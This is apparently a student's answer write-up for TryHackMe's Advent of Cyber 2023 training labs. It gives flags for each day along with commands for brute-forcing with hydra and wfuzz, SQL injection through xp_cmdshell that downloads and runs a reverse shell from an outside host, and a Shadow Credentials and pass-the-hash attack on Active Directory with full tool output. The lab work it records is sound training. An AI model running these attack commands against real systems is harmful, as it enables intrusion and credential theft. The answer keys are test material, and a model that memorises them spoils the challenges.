# Task 1 - Task 6 
+ Introduction to Advent Of Cyber 2023
# Task 7 [Day 1] Machine learning Chatbot, tell me, if you're really safe?
+ What is McGreedy's personal email address? `t.mcgreedy@antarcticrafts.thm`
+ What is the password for the IT server room door? `BtY2S02`
+ What is the name of McGreedy's secret project? `Purple Snow`
+ If you enjoyed this room, we invite you to join our Discord server for ongoing support, exclusive tips, and a community of peers to enhance your Advent of Cyber experience `No answer needed`

# Task 8 [Day 2] Log analysis O Data, All Ye Faithful
+ Open the notebook "Workbook" located in the directory "4_Capstone" on the VM. Use what you have learned today to analyse the packet capture. `No Answer Needed`
```python
import pandas as pd
df = pd.read_csv('network_traffic.csv')
df.count() 
df.groupby(['Source']).size() 
df.groupby(['Protocol']).size()
```
+ How many packets were captured (looking at the PacketNumber)? `100`
+ What IP address sent the most amount of traffic during the packet capture? `10.10.1.4`
+ What was the most frequent protocol? `ICMP`
+ If you enjoyed today's task, check out the Intro to Log Analysis room. `No Answer Needed`

# Task 9 [Day 3] Brute-forcing Hydra is Coming to Town
+ Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag? `THM{pin-code-brute-force}`
    - create list of password using crunch
    ```bash
    crunch 3 3 0123456789ABCDEF -o 3digits.txt
    Crunch will now generate the following amount of data: 16384 bytes
    0 MB
    0 GB
    0 TB
    0 PB
    Crunch will now generate the following number of lines: 4096 

    crunch: 100% completed generating output
    ```
    - brute - force the machine
    ```bash
    hydra -l '' -P 3digits.txt -f -v 10.10.215.76 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
    [8000][http-post-form] host: 10.10.215.76   password: 6F5
    [STATUS] attack finished for 10.10.215.76 (valid pair found)
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-04 02:15:53
    ```

+ If you have enjoyed this room please check out the Password Attacks room. `No Answer Needed`


# Task 10  [Day 4] Brute-forcing Baby, it's CeWLd outside
+ Creating Wordlist 
    ```bash 
    ┌──(lodwig㉿kali)-[~/Documents/THM/AoC2023]
    └─$ cewl -d 2 -m 5 -w passwords.txt http://10.10.121.234 --with-numbers
    CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
    
    ┌──(lodwig㉿kali)-[~/Documents/THM/AoC2023]
    └─$ cewl -d 0 -m 5 -w usernames.txt http://10.10.121.234/team.php --lowercase
    CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
    
    ┌──(lodwig㉿kali)-[~/Documents/THM/AoC2023]
    └─$ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.121.234/login.php -d "username=FUZZ&password=FUZ2Z"
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.10.121.234/login.php
    Total requests: 9361

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload
    =====================================================================
    000006317:   302        118 L    297 W      4442 Ch     "isaias - Happiness"
    ```


+ What is the correct username and password combination? Format username:password `isaias:Happiness`
+ What is the flag? `THM{m3rrY4nt4rct1crAft$}`
+ If you enjoyed this task, feel free to check out the Web Enumeration room. `No Answer Needed`

# Task 11  [Day 5] Reverse engineering A Christmas DOScovery: Tapes of Yule-tide Past
+ How large (in bytes) is the AC2023.BAK file? `12,704`
+ What is the name of the backup program? `BackupMaster3000`
+ What should the correct bytes be in the backup's file signature to restore the backup properly? `41 43`
+ What is the flag after restoring the backup successfully?`THM{0LD_5CH00L_C00L_d00D}`
+ What you've done is a simple form of reverse engineering, but the topic has more than just this. If you are interested in learning more, we recommend checking out our x64 Assembly Crash Course room, which offers a comprehensive guide to reverse engineering at the lowest level. `No Answer Needed`

# Task 12  [Day 6] Memory corruption Memories of Christmas Past
+ If the coins variable had the in-memory value in the image below, how many coins would you have in the game?`1397772111`
+ What is the value of the final flag? `THM{mchoneybell_is_the_real_star}`
+ We have only explored the surface of buffer overflows in this task. Buffer overflows are the basis of many public exploits and can even be used to gain complete control of a machine. If you want to explore this subject more in-depth, feel free to check the Buffer Overflows room. `No Answer Needed`
+ Van Jolly still thinks the Ghost of Christmas Past is in the game. She says she has seen it with her own eyes! She thinks the Ghost is hiding in a glitch, whatever that means. What could she have seen? `No Answer Needed`

# Task 13  [Day 7] Log analysis ‘Tis the season for log chopping!
+ How many unique IP addresses are connected to the proxy server? `9`
    ```bash
    cut -d ' ' -f2 access.log | sort | uniq | wc -l
    ```
+ How many unique domains were accessed by all workstations? `111`
    ```bash
    cut -d ' ' -f3 access.log | cut -d':' -f1 | sort | uniq -c | wc -l
    ```
+ What status code is generated by the HTTP requests to the least accessed domain?`503`
    ```bash
    cut -d ' ' -f3 access.log | cut -d':' -f1 | sort | uniq -c | sort -n | head -n1
    grep "partnerservices.getmicrosoftkey.com" access.log | cut -d ' ' -f6 | uniq
    ```
+ Based on the high count of connection attempts, what is the name of the suspicious domain?`frostlings.bigbadstash.thm`
    ```bash
    ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d':' -f1 | sort | uniq -c | sort -nr | head -n 5
    4992 www.office.com
    4695 login.microsoftonline.com
    1860 www.globalsign.com
    1581 frostlings.bigbadstash.thm
    1554 learn.microsoft.com
    ```
+ What is the source IP of the workstation that accessed the malicious domain?`10.10.185.225`
    ```bash
    ubuntu@tryhackme:~/Desktop/artefacts$ grep "frostlings.bigbadstash.thm" access.log | cut -d ' ' -f2 | sort |uniq -c
    1581 10.10.185.225
    ```
+ How many requests were made on the malicious domain in total? `1581`
+ Having retrieved the exfiltrated data, what is the hidden flag? `THM{a_gift_for_you_awesome_analyst!}`
    ```bash
    ubuntu@tryhackme:~/Desktop/artefacts$ grep "frostlings.bigbadstash.thm" access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d | grep -oE "THM{.*}"
    THM{a_gift_for_you_awesome_analyst!}
    ```
+ If you enjoyed doing log analysis, check out the Log Analysis module in the SOC Level 2 Path.`No Answer Needed`

# Task 14  [Day 8] Disk forensics Have a Holly, Jolly Byte!
+ What is the malware C2 server? `mcgreedysecretc2.thm`
+ What is the file inside the deleted zip archive?`JuicyTomaTOY.exe`
+ What flag is hidden in one of the deleted PNG files?`THM{byt3-L3vel_@n4Lys15}`
+ What is the SHA1 hash of the physical drive and forensic image?`39f2dea6ffb43bf80d80f19d122076b3682773c2`
+ If you liked today's challenge, the Digital Forensics Case B4DM755 room is an excellent overview of the entire digital forensics and incident response (DFIR) process! `No Answer Needed`

# Task 15  [Day 9] Malware analysis She sells C# shells by the C2shore
+ What HTTP User-Agent was used by the malware for its connection requests to the C2 server? `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15`
+ What is the HTTP method used to submit the command execution output?`POST`
+ What key is used by the malware to encrypt or decrypt the C2 data? `youcanthackthissupersecurec2keys`
+ What is the first HTTP URL used by the malware?`http://mcgreedysecretc2.thm/reg`
+ How many seconds is the hardcoded value used by the sleep function?`15`
+ What is the C2 command the attacker uses to execute commands via cmd.exe? `shell`
+ What is the domain used by the malware to download another binary? `stash.mcgreedy.thm`
+ Check out the Malware Analysis module in the SOC Level 2 Path if you enjoyed analysing malware.`No Answer Needed`

# Task 16  [Day 10] SQL injection Inject the Halls with EXEC Queries
+ Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature? `/giftsearch.php`
+ Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?`ODBC Driver 17 for SQL Server`
+ Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
`THM{a4ffc901c27fb89efe3c31642ece4447}`
+ What flag is in the note file Gr33dstr left behind on the system?`THM{b06674fedd8dfc28ca75176d3d51409e}`
    - Reconfigure CMD EXE `http://10.10.247.74/giftresults.php?age=%27;%20EXEC%20sp_configure%20%27show%20advanced%20options%27,%201;%20RECONFIGURE;%20EXEC%20sp_configure%20%27xp_cmdshell%27,%201;%20RECONFIGURE;%20--`
    - Upload shell `http://10.10.247.74/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.4.37.160:81/rev.exe C:\Windows\Temp\reverse.exe'; --`
    - Exploit using uploaded shell `http://10.10.247.74/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`
    ```powershell
    C:\Users\Administrator\Desktop>type Note.txt
    type Note.txt
    ====================
    Hey h4ck3r0192,

    I recieved your Bitcoin payment, thanks again for a speedy transaction.

    After you gain access to the server, you can deface the website by running the deface_website.bat script in C:\Users\Administrator\Desktop. Feel free to dump the database and steal whatever you want.

    If you need to revert the changes back to the original site for any reason, just run restore_website.bat from the same directory.

    Also, I shouldn't need to mention this, but PLEASE DELETE this Note.txt file after defacing the website! Do NOT let this hack tie back to me.

    -Gr33dstr

    THM{b06674fedd8dfc28ca75176d3d51409e}
    ```
+ What is the flag you receive on the homepage after restoring the website?`THM{4cbc043631e322450bc55b42c}`
    ```powershell
    C:\Users\Administrator\Desktop>restore_website.bat
    restore_website.bat
    Removing all files and folders from C:\inetpub\wwwroot...
    Website restoration completed. Please refresh the home (/index.php) page to see the changes and obtain your flag!
    ```
+ If you enjoyed this task, feel free to check out the Software Security module.`No Answer Needed`

# Task 17  [Day 11] Active Directory Jingle Bells, Shadow Spells
### Shadow Credentials attack
    ```powershell
    PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" }

    ObjectDN                : CN=vansprinkles,CN=Users,DC=AOC,DC=local
    AceQualifier            : AccessAllowed
    ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
    ObjectAceType           : None
    AceFlags                : None
    AceType                 : AccessAllowed
    InheritanceFlags        : None
    SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1115
    IdentityReferenceName   : hr
    IdentityReferenceDomain : AOC.local
    IdentityReferenceDN     : CN=hr,CN=Users,DC=AOC,DC=local
    IdentityReferenceClass  : user

    PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
    [*] No path was provided. The certificate will be printed as a Base64 blob
    [*] No pass was provided. The certificate will be stored with the password RUzA0jtdhkypUVSP
    [*] Searching for the target account
    [*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
    [*] Generating certificate
    [*] Certificate generaged
    [*] Generating KeyCredential
    [*] KeyCredential generated with DeviceID 3561218f-2560-4ff1-923b-cb6874abee14
    [*] Updating the msDS-KeyCredentialLink attribute of the target object
    [+] Updated the msDS-KeyCredentialLink attribute of the target object
    [*] You can now run Rubeus with the following syntax:

    Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"RUzA0jtdhkypUVSP" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

     ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.2.3

    [*] Action: Ask TGT

    [*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
    [*] Using domain controller: fe80::1c3d:d1e:afb0:107e%5:88
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        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
        T0MubG9jYWw=

    ServiceName              :  krbtgt/AOC.local
    ServiceRealm             :  AOC.LOCAL
    UserName                 :  vansprinkles
    UserRealm                :  AOC.LOCAL
    StartTime                :  12/13/2023 12:38:20 PM
    EndTime                  :  12/13/2023 10:38:20 PM
    RenewTill                :  12/20/2023 12:38:20 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  KxLRaKA5+0RZeW+eZwcL/A==
    ASREP (key)              :  B76F2EAE67F489AC81B5EE929DA77B2B

    [*] Getting credentials using U2U

    CredentialInfo         :
        Version              : 0
        EncryptionType       : rc4_hmac
        CredentialData       :
        CredentialCount    : 1
        NTLM              : 03E805D8A8C5AA435FB48832DAD620E3
    ```

    - On attack box use Evil-WinRM
    ```bash
    ┌──(lodwig㉿kali)-[~]
    └─$ evil-winrm -H 03E805D8A8C5AA435FB48832DAD620E3 -i 10.10.153.173 -u vansprinkles
    ```
+ What is the hash of the vulnerable user?`03E805D8A8C5AA435FB48832DAD620E3`
+ What is the content of flag.txt on the Administrator Desktop? `THM{XMAS_IS_SAFE}`
+ If you enjoyed this task, feel free to check out the Compromising Active Directory module! `No Answer Needed`
+ Van Sprinkles left some stuff around the DC. It's like a secret message waiting to be unravelled! `No Answer Needed`

# Task 18  [Day 12] Defence in depth Sleighing Threats, One Layer at a Time
+ What is the default port for Jenkins?`8080`
+ What is the password of the user tracy?`13_1n_33`
+ What's the root flag?`ezRo0tW1thoutDiD`
+ What is the error message when you login as tracy again and try sudo -l after its removal from the sudoers group? `Sorry, user tracy may not run sudo on jenkins.`
+ What's the SSH flag?`Ne3d2SecureTh1sSecureSh31l`
+ What's the Jenkins flag?`FullTrust_has_n0_Place1nS3cur1ty`
+ If you enjoyed this room, please check out our SOC Level 1 learning path.`No Answer Needed`

# Task 19  [Day 13] Intrusion detection To the Pots, Through the Walls
+ Which security model is being used to analyse the breach and defence strategies?`Diamond model`
+ Which defence capability is used to actively search for signs of malicious activity?`Threat hunting`
+ What are our main two infrastructure focuses? (Answer format: answer1 and answer2)`Firewall and Honeypot`
+ Which firewall command is used to block traffic? `deny`
+ There is a flag in one of the stories. Can you find it?`THM{P0T$_W@11S_4_S@N7@}`
+ If you enjoyed this task, feel free to check out the Network Device Hardening room.`No Answer Needed`

# Task 20  [Day 14] Machine learning The Little Machine That Wanted to Learn
+ What is the other term given for Artificial Intelligence or the subset of AI meant to teach computers how humans think or nature works?`machine learning`
+ What ML structure aims to mimic the process of natural selection and evolution?`Genetic algorithm`
+ What is the name of the learning style that makes use of labelled data to train an ML structure?`Supervised learning`
+ What is the name of the layer between the Input and Output layers of a Neural Network?`Hidden layer`
+ What is the name of the process used to provide feedback to the Neural Network on how close its prediction was?`Back-Propagation`
+ What is the value of the flag you received after achieving more than 90% accuracy on your submitted predictions? `THM{Neural.Networks.are.Neat!}`
+ If you enjoyed this room, we invite you to join our Discord server for ongoing support, exclusive tips, and a community of peers to enhance your Advent of Cyber experience! `No Answer Needed`

# Task 21  [Day 15] Machine learning Jingle Bell SPAM: Machine Learning Saves the Day!
+ What is the key first step in the Machine Learning pipeline?`Data Collection`
+ Which data preprocessing feature is used to create new features or modify existing ones to improve model performance?`Feature Engineering`
+ During the data splitting step, 20% of the dataset was split for testing. What is the percentage weightage avg of precision of spam detection?`0.98`
+ How many of the test emails are marked as spam?`3`
+ One of the emails that is detected as spam contains a secret code. What is the code?`I_HaTe_BesT_FestiVal`
+ If you enjoyed this room, please check out the Phishing module.`No Answer Needed`

# Task 22  [Day 16] Machine learning Can't CAPTCHA this Machine!
+ What key process of training a neural network is taken care of by using a CNN?`feature extraction`
+ What is the name of the process used in the CNN to extract the features?`convolution`
+ What is the name of the process used to reduce the features down?`pooling`
+ What off-the-shelf CNN did we use to train a CAPTCHA-cracking OCR model? `attention ocr`
+ What is the password that McGreedy set on the HQ Admin portal?`ReallyNotGonnaGuessThis`
+ What is the value of the flag that you receive when you successfully authenticate to the HQ Admin portal?`THM{Captcha.Can't.Hold.Me.Back}`
+ If you enjoyed this room, check out our Red Teaming learning path! `No Answer Needed`

# Task 23  [Day 17] Traffic analysis I Tawt I Taw A C2 Tat! 
+ Which version of SiLK is installed on the VM?`3.19.1`
+ What is the size of the flows in the count records?`11774`
+ What is the start time (sTime) of the sixth record in the file?`2023/12/05T09:33:07.755`
+ What is the destination port of the sixth UDP record?`49950`
+ What is the record value (%) of the dport 53?`35.332088`
+ What is the number of bytes transmitted by the top talker on the network?`735229`
+ What is the sTime value of the first DNS record going to port 53?`2023/12/08T04:28:44.825`
+ What is the IP address of the host that the C2 potentially controls? (In defanged format: 123[.]456[.]789[.]0 )`175[.]175[.]173[.]221`
+ Which IP address is suspected to be the flood attacker? (In defanged format: 123[.]456[.]789[.]0 )`175[.]215[.]236[.]223`
+ What is the sent SYN packet's number of records?`1658`
+ We've successfully analysed network flows to gain quick statistics. If you want to delve deeper into network packets and network data, you can look at the Network Security and Traffic Analysis module.`No Answer Needed`

# Task 24  [Day 18] Eradication A Gift That Keeps on Giving
+ What is the name of the service that respawns the process after killing it?`a-unkillable.service`
+ What is the path from where the process and service were running?`/etc/systemd/system`
+ The malware prints a taunting message. When is the message shown? Choose from the options below.
    1. Randomly
    2. After a set interval
    3. On process termination
    4. None of the above
    `4`
+ If you enjoyed this task, feel free to check out the Linux Forensics room.`No Answer Needed`

# Task 25  [Day 19] Memory forensics CrypTOYminers Sing Volala-lala-latility
+ What is the exposed password that we find from the bash history output?`NEhX4VSrN7sV`
    ```bash
    ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
    Volatility Foundation Volatility Framework 2.6.1
    Pid      Name                 Command Time                   Command
    -------- -------------------- ------------------------------ -------
        8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
        8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
        8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
        8092 bash                 2023-10-02 18:15:55 UTC+0000   make
        8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history
        8092 bash                 2023-10-02 18:16:38 UTC+0000
        8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
        8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
        8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
        8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history
        10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
        10205 bash                 2023-10-02 18:19:58 UTC+0000   id
        10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
        10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
        10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
        10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history
        10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/
    ```
+ What is the PID of the miner process that we find? `10280`
+ What is the MD5 hash of the miner process? `153a5c8efe4aa3be240e5dc645480dee`
+ What is the MD5 hash of the mysqlserver process? `c586e774bb2aa17819d7faae18dad7d1`
+ Use the command strings extracted/miner.<PID from question 2>.0x400000 | grep http://. What is the suspicious URL? (Fully defang the URL using CyberChef)`hxxp[://]mcgreedysecretc2[.]thm`
    ```bash
    ubuntu@volatility:~/Desktop/Evidence$ strings extracted/miner.10280.0x400000 | grep http://
    "cpu":""idle":"nice":"user":	types 	value=abortedaccept4alt -> answersany -> charsetchunkedcmdlineconnectcpuinfocpuprofcs     derivedenvironexpiresfloat32float64forcegcfs     fstatatgatewaygctracegetconfgs     head = http://invalidlookup modulesnil keynop -> panic: r10    r11    r12    r13    r14    r15    r8     r9     rax    rbp    rbx    rcx    rdi    rdx    refererrefreshrflags rip    rsi    rsp    runningserial:signal stoppedsyscalltraileruintptrunknownupgradevboxdrvwaiting data=%q etypes  goal
